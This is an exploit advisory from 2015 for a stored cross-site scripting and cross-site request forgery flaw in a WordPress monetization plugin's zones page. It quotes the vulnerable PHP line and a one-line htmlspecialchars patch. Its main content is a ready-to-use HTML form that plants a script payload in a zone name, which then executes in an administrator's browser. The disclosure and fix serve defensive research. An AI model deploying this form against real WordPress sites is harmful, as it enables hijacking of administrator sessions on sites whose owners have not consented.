# Exploit Author : Ashiyane Digital Security Team
# Date: 2015-08-07
# Tested On : Kali Linux - FireFox
# Version : 1.03
######################
# Vulnerable Code:
File: class-monetize-zones-list-table.php - Line 45

$zone_name_link = &#039;<a  
href="?page=monetize-zones&monetize-zone-id=&#039;.$item[&#039;zone_id&#039;].&#039;">&#039;.$item[&#039;zone_name&#039;].&#039;</a>&#039;;
######################
# Exploit:

<form name="monetize-zone-new-edit-form" method="post"  
action="http://[URL]/[Path]/wp-admin/admin.php?page=monetize-zones-new">
<input style="width: 25em;" type="hidden"  
value=&#039;"><script>alert(/Mahdi.Hidden/)</script>&#039;  
id="monetize-zone-name" name="monetize-zone-name" size="25"/>
<input type="hidden" value="222" name="monetize-zone-width" />
<input type="hidden" value="222" name="monetize-zone-height" />
<input type="hidden" value="222" name="monetize-zone-css" />
<input type="submit" value="Add New Zone" name="monetize-zone-new-edit" />
</form>

# Explain:

Use this exploit to add a "zone" which has malicious code and then if  
admin goes to page "View All Zones" (URL:  
/wp-admin/admin.php?page=monetize-zones) your code will execute.
######################
# Patch:
File: class-monetize-zones-list-table.php - Line 45

$zone_name_link = &#039;<a  
href="?page=monetize-zones&monetize-zone-id=&#039;.$item[&#039;zone_id&#039;].&#039;">&#039;.htmlspecialchars($item[&#039;zone_name&#039;]).&#039;</a>&#039;;
######################
# Discovered By : Mahdi.Hidden
######################

